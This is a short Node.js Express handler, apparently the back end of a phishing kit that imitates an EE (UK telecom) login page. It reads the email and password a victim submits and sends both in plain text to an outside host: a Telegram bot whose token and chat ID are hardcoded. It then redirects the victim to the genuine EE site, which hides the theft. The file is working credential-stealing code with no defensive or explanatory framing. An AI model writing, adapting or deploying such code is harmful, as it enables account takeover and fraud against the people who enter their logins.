// api/submit.js

const express = require('express');
const axios = require('axios');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Telegram Bot API details
const telegramBotToken = '7362880252:AAFoMzgfag6Y8pUXNgiAMcdGZEpKwQsmCxE'; // Your real token
const chatId = '7587120060'; // Your real chat ID

app.post('/api/submit', async (req, res) => {
    try {
        const { email, password } = req.body;

        if (!email || !password) {
            return res.status(400).json({ success: false, message: "Email and password are required." });
        }

        const message = `New login attempt:\nEmail: ${email}\nPassword: ${password}`;

        await axios.post(`https://api.telegram.org/bot ${telegramBotToken}/sendMessage`, {
            chat_id: chatId,
            text: message
        });

        // Respond with JSON instead of redirecting directly
        res.json({ success: true, redirectUrl: 'https://ee.co.uk/ ' });

    } catch (error) {
        console.error('Error:', error.message);
        res.status(500).json({ success: false, message: "Server error. Please try again." });
    }
});

module.exports = app;
